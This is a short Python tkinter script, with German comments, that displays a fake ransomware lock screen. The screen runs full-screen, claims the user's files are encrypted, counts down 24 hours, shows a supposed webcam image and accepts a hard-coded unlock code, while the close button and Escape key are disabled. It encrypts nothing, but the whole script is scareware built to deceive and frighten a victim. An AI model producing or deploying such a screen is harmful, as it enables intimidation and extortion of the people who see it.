import tkinter as tk
from PIL import Image, ImageTk
import threading
import time
from datetime import datetime, timedelta

# Countdown-Zeit
COUNTDOWN_TIME = timedelta(hours=24)
end_time = datetime.now() + COUNTDOWN_TIME

# Fenster erstellen
root = tk.Tk()
root.title("YOUR FILES ARE ENCRYPTED")
root.attributes('-fullscreen', True)
root.configure(bg="black")

# Funktion: Timer aktualisieren
def update_timer():
    while True:
        remaining = end_time - datetime.now()
        if remaining.total_seconds() <= 0:
            timer_label.config(text="00:00:00")
            break
        timer_label.config(text=str(remaining).split('.')[0])
        time.sleep(1)

# Funktion: Code überprüfen
def check_code():
    code = entry.get()
    if code == "12345678901234567890":
        result_label.config(text="Code accepted. Files restored.", fg="green")
    else:
        result_label.config(text="Invalid code.", fg="red")

# Layout
tk.Label(root, text="WARNING: YOUR FILES ARE ENCRYPTED!", fg="red", bg="black", font=("Arial", 30, "bold")).pack(pady=20)
tk.Label(root, text="All your important files have been locked by advanced encryption.", fg="red", bg="black", font=("Arial", 12)).pack(pady=5)
tk.Label(root, text="YOU HAVE", fg="white", bg="black", font=("Arial", 22)).pack()
timer_label = tk.Label(root, text="24:00:00", fg="red", bg="black", font=("Arial", 36, "bold"))
timer_label.pack()
tk.Label(root, text="TO COMPLY!", fg="white", bg="black", font=("Arial", 22)).pack()
tk.Label(root, text="Failure to comply will result in complete data loss.", fg="red", bg="black", font=("Arial", 12)).pack(pady=10)

# Webcam-Bild laden (Fake)
try:
    img = Image.open("webcam.jpg")
    img = img.resize((250, 250))
    photo = ImageTk.PhotoImage(img)
    tk.Label(root, image=photo, bg="black").pack(pady=10)
except Exception as e:
    tk.Label(root, text="[Image could not be loaded]", fg="gray", bg="black").pack()

# Code-Eingabe
entry = tk.Entry(root, font=("Courier", 16), justify='center')
entry.pack(pady=10)
tk.Button(root, text="Submit", command=check_code, font=("Arial", 14), bg="gray").pack()
result_label = tk.Label(root, text="", fg="white", bg="black", font=("Arial", 12))
result_label.pack(pady=5)

# ESC und Schließen blockieren
def disable_event():
    pass
root.protocol("WM_DELETE_WINDOW", disable_event)
root.bind("<Escape>", lambda e: None)

# Timer starten
threading.Thread(target=update_timer, daemon=True).start()
root.mainloop()
